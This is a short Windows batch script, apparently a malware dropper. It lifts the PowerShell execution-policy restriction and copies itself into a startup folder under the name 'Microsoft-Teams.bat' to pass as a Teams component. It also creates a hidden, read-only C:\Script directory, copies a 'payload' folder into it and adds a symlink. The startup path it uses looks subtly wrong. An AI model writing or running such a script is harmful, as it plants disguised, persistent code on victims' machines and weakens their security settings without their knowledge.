@echo off
powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force"
xcopy ".\Microsoft-Teams.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Scripts\Startup\" /Y
mkdir "C:\Script"
attrib +h "C:\Script"
attrib +r "C:\Script"
xcopy ".\payload" "C:\Script" /E /I /H /Y
cd "C:\Script"
mklink /D "C:\Script\OldDir" "%~dp0.."
